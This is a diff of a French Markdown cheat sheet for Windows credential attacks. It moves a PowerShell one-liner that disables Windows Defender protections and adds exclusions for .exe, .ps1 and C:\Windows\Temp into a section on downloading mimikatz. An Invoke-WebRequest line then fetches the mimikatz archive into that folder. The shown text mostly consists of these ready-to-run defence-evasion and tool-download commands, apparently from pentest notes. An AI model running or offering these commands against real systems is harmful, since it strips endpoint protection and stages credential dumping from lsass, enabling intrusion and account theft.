@@ -793,10 +793,7 @@ klist
 > [!NOTE] 
 > Le processus **lsass.exe** (Local Security Authority SubSystem) gère des informations d'identifications qui sont stockées en mémoire.
 
-### Désactiver Defender, exclusion "C:\Windows\Temp", exclusion des  .exe et .ps1
-```powershell		
-Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
-```
+
 
 <br>
 
@@ -805,6 +802,12 @@ Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $tr
 <br>
 
 ### Télécharger mimikatz
+
+Désactiver Defender, exclusion "C:\Windows\Temp", exclusion des .exe et .ps1
+```powershell		
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+```
+
 ```powershell
 Invoke-WebRequest https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -OutFile "C:\Windows\Temp\mimi.zip"
 sl "C:\Windows\Temp"
